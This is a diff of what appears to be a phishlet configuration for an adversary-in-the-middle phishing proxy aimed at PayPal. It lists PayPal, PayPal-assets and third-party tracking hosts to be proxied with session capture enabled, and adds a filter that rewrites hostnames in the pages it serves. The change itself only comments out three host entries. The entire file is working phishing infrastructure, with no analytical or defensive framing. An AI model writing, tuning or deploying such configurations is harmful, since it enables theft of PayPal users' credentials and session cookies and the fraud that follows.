@@ -10,14 +10,14 @@ proxy_hosts:
   - {phish_sub: 'c', orig_sub: 'c', domain: 'paypal.com', session: true, is_landing: false, auto_filters: true}
   - {phish_sub: 't', orig_sub: 't', domain: 'paypal.com', session: true, is_landing: false, auto_filters: true}
   - {phish_sub: 'ddbm2', orig_sub: 'ddbm2', domain: 'paypal.com', session: true, is_landing: false, auto_filters: true}
-  - {phish_sub: 'www', orig_sub: 'www', domain: 'gstatic.com', session: true, is_landing: false, auto_filters: true}
+  # - {phish_sub: 'www', orig_sub: 'www', domain: 'gstatic.com', session: true, is_landing: false, auto_filters: true}
   - {phish_sub: 'www', orig_sub: 'www', domain: 'paypalobjects.com', session: true, is_landing: false, auto_filters: true}
   - {phish_sub: '', orig_sub: '', domain: 'browser-intake-us5-datadoghq.com', session: true, is_landing: false, auto_filters: true}
   - {phish_sub: 'c6', orig_sub: 'c6', domain: 'paypal.com', session: true, is_landing: false, auto_filters: true}
-  - {phish_sub: 'i', orig_sub: 'i', domain: 'paypal.com', session: true, is_landing: false, auto_filters: true}
+  # - {phish_sub: 'i', orig_sub: 'i', domain: 'paypal.com', session: true, is_landing: false, auto_filters: true}
   - {phish_sub: 'slc.stats', orig_sub: 'slc.stats', domain: 'paypal.com', session: true, is_landing: false, auto_filters: true}
   - {phish_sub: 'b.stats', orig_sub: 'b.stats', domain: 'paypal.com', session: true, is_landing: false, auto_filters: true}
-  - {phish_sub: 'api', orig_sub: 'api', domain: 'sprig.com', session: true, is_landing: false, auto_filters: true}
+  # - {phish_sub: 'api', orig_sub: 'api', domain: 'sprig.com', session: true, is_landing: false, auto_filters: true}
 
 sub_filters:
   - {triggers_on: 'www.paypal.com', orig_sub: 'www', domain: 'paypal.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html', 'text/javascript', 'application/json', 'application/javascript', 'application/x-javascript']}
